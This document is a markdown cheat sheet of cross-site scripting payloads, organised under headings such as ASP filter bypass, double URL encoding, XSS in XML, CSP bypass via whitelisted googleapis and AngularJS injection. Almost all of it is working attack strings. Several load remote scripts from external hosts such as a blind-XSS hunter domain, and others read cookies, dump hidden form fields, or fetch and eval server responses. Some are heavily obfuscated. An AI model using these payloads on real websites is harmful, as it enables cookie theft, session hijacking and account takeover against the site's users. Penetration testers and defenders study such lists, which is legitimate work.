> Blind XSS payload XXShunter

```"><script src=https://a007.xss.ht></script>```

> ASP filter bypass

```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```

> Double URL encoding

```%253Cscript%253Ealert(1)%253C%252Fscript%253E```

> XSS in XML

```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```

```<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>```

```<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>```

> Where :// is required after protocol

```javascript://%250aalert(1)```

> XSS in email addresses

```"\"><s>test"@gmail.com```
  
```javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));```

```<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>```

```<imG/sRc=l oNerrOr=(prompt)() x>```

 ```<body onpageshow=alert(1)>```

```<style onload=alert(1)>```

```<marquee behavior="alternate" onstart=alert(1)>XSS</marquee>```

```<d3"<"/onclick="1>[confirm``]"<">z```

```&lt;script&gt;confirm(1)&lt;/script&gt;```

> GET Hidden Fields data

```<script>var xss = '';f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}};//'';</script>```

```<table><thead style=font-size:100px onmouseover=prompt(1)><td>XSS```

```<svg/x=">"/onload=confirm()//```

```<sCript x>(((confirm)))``</scRipt x>```

```<svg </onload ="1> (_=prompt,_(1)) "">```

```<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>```

```<w="/x="y>"/ondblclick=`<`[confir\u006d``]>XXS```

```<script/x>alert(1)</script/x>```

```"><!--<iMg sRc=--><img src=x oNERror=(prompt)`1` x>"```

```"><deTails oNToggle=confi\u0072m(1)>"```

> Get response back to server

```<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:8080");a.send();</script>```

```<A/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x>XSS```

```data:,alert(1)```

```\'-alert(1)//```

```'}alert(1);{'```

```'}alert(1)%0A{'```

```\'}alert(1);{//```

> CSP bypass if http://ajax.googleapis.com is whitelisted

```<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>```

```<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>```

```<script src=data:,alert(1)>```


> Angular JS XSS

```{{constructor.constructor('alert(1)')()}}```

```<x ng-app>{{constructor.constructor('alert(1)')()}} ```

> Upper Case

```<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>```

 ```<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>```
 
```data:text/html,<svg onload=alert(1)>```

> Shortest payloads injection

```<a/href=//0>```
```<script src=//14.rs>```

> Before form Tags

```<k onsubmit=alert(1)>```

```<k oninput=alert(1)>```

```foobar"/%0D<body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//```

```<script ~~~>confirm(1)</script ~~~>```

```window+=valueOf=alert(1)```

```[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`0\x29`))();//```

```<script>([_,_____,_,_,__,___]=(__=[])+{___:__},[______,_,________,____,,_________,_______,__,,,__________]=[!!_____]+!_____+_____._____)[___+=_____+__________+__+______+_+________+___+______+_____+_][___](_________+_______+____+_+______+'(-~_____)')(__)</script>```

```<script>([,?,,,,??]=[]+{},[???,????,?????,??????,,???????,????????,?????????,,,??????????]=[!!?]+!?+?.?)[??+=?+??????????+?????????+???+????+?????+??+???+?+????][??](???????+????????+??????+????+???+'`1`')``</script>```

```<script>this[Object["keys"](this)[6]](1)</script>```

> Space and slash not working

```<svgonload=alert(1)>```

```<svG oNLoad=confirm&#x28;1&#x29>```

```<xss/ondblclick=[cookie].some(alert)>XSS```

>Hidden field XSS

```"accesskey="X" onclick=alert(1) ```
